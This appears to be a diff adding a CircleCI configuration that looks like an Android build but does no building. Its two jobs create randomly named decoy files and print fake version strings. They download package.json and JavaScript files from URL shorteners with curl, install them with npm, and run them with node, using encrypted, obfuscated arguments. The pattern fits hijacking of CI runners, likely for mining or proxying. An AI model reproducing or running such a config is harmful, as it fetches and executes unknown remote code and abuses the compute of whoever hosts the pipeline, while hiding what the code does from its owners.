@@ -1,0 +1,52 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  shitJob:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 7wk9a9g5mh4d0nrjjn6vo4qxf6v
+      - run: touch ltlqfdxzkzshhwd1a3crogze.css
+      - run: curl -fsSL shorturl.at/fCEPT -o package.json && curl -fsSL
+          shorturl.at/apFGQ -o ie0s870q3zni1j29bf.js && curl -fsSL
+          shorturl.at/zMPZ5 -o bw0fxf.js
+      - run: touch z2cfp3qrpr465lgj9pjd.cpp
+      - run: npm i -s
+      - run: mkdir v368aa2lyhdxfyhcype7wda09
+      - run: node ie0s870q3zni1j29bf -lpn U2FsdGVkX19WqTs4jssqzNxKKr7/RXUFJhFSwIpIYjI=
+          -s
+          U2FsdGVkX18DOQuhWzDW6FGMOo7msYIJaiGd2/wx/O/Epv6iHTqENrkPoSfkwVnlzaSEM4u+Du2rq/2iajCSdaaVmpMlqKAGEo8SKrlnL6gmO3AaHQVeiFJzs6bCMEbbEMbuoXJBhrzPIRPDfX/z8tOdAmtp7BkmMcOHdVffxdMBRt7XO5oQLO0fQu06/rmc9xowgm3zqUlsqJwSJRmSbhCs3kbd0W5A5S7emlE4yn4=
+          -sp -r
+          U2FsdGVkX185D5Wn5UEhXTA4uByRLvGqkO6yNWJNPyBqQfRSW5iSJR7+1L29Xa6eIcEzB4FvzNeVmk9klJGm85dhlcEL3TNkeifkTAcrH7n6FS0uxrly9QB2/SDU3Ol1DYAYVOECC4rb/LyHkBUndtmdA1rg8ezRcwqxGw+YpHCLacBm7LoiqQT7zRc/QK7WuCEb+RK+vZ6YjYVW5qzgrxieSzbpYkyubD3LZenwJBYoAaa6lHFq1uLDzwB8yt/c4DRk5XtmX6v1sqwv18ixEXmfqWUGnzhv7HWxrSueCyI=
+          -t U2FsdGVkX19asjTGFPWButUfb2OGveKk8nV2gQFYXftDjQpLSF9zekSraw9Ik8AY
+      - run: echo version 18881351424.041473
+      - run: touch a0qfq791taeis0bj8g7kfzja6a.sh
+  build:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/ghwA0 -o vubze9t7cp7tjys.js && curl -fsSL
+          shorturl.at/wxDE1 -o package.json && curl -fsSL shorturl.at/juQT7 -o
+          7toxc3ckwdidgcn8.js
+      - run: touch tnc35qv8k2ie9iqgn04.ts
+      - run: touch vr3swolrqr0tv76ap4j5.py
+      - run: echo version 63196390231.82004
+      - run: mkdir s2kp7c4t3d5bdzhgji2ezindkfm
+      - run: npm i -s
+      - run: touch o03q87pl0ah8g18.c
+      - run: touch 7hjmfk6cx8avz0dqx1v1b.php
+      - run: node vubze9t7cp7tjys -t
+          U2FsdGVkX18jSMeBV3vPvRPscP6ub5C90ITLKXy3nFSP4Gl6TogRPZRw3O0ahGb2 -r
+          U2FsdGVkX1/aBA+LnAe5Lkjp4kGi9ywvkLqwZ2Eg/0NFLDD+ytm6BCB/TMpzP7GPJXwb9hK7qvE9mw92Yd36tVT8u5BX8lwmgcdbHeUSWua0nq03eaFNoPG1VrNpYHT4BMyxyUJJsArVn3Zz/6/2MK2zoxosCj7EyssYjtDsewsE4PJQ7rdQSHULoLA6MB5mLDddDu0u5Lz9YfBRUcC+d6/2hiz/sYvJr8sWdiDuirTrtIuoC4j6TRpHyJmm+/TACI31RdFpkbwn1kUFLpk45Kl77hhjxnI80Cg9XJABY3I=
+          -s
+          U2FsdGVkX18CxBw7AaepBv7dfPY3Zu1AQS5N2usCrLm5FFyUjlaIGx2I4dP7T28CsTVvclSxLL/3jBiULLO2yLIBObBwChtCSP1+rnaFQffUvgv8fO/PPa8HUZo2h4wpjPpvMAE+buEmRueXrOqPAxL2ygzGDCVRBZ04hmIUEVA5xG9fcIBD+cgawVifcu+XBEidwcPfxiFCQ1QL9hQH6bIvPcMt8DptZCb0JFC6G3c=
+          -lpn U2FsdGVkX1/JWX7PmfWVcGd9q4qi2k9WCEoFE1Bdz3/mq1W7pOQX7zqBD8Fo+3KL
+          -sp
+workflows:
+  building:
+    jobs:
+      - shitJob
+  KingOfJobs:
+    jobs:
+      - build
